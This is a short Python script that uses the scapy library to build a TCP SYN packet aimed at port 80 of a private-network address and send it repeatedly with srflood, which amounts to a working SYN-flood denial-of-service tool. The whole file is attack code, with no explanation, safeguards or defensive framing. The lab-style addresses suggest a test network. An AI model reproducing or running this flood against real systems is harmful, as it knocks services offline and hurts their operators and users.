import sys
from scapy.all import TCP, IP, srflood

packet = IP(src="192.168.65.131",dst="192.168.65.1")/TCP(dport=80,flags="S")
srflood(packet)
